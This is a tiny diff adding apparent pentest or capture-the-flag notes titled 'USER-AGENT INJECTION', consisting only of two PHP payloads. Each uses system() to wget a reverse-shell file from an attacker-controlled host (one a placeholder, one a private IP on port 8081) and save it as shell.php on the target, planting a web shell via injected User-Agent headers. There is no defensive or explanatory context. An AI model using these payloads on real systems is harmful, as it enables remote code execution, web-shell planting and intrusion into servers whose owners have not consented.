@@ -1,0 +1,5 @@
+USER-AGENT INJECTION
+<?system('wget http://[IP attack box]/revshell.txt -O shell.php');?>
+
+<?system('wget http://172.16.3.1:8081/shell.txt -O shell.php');?>
+
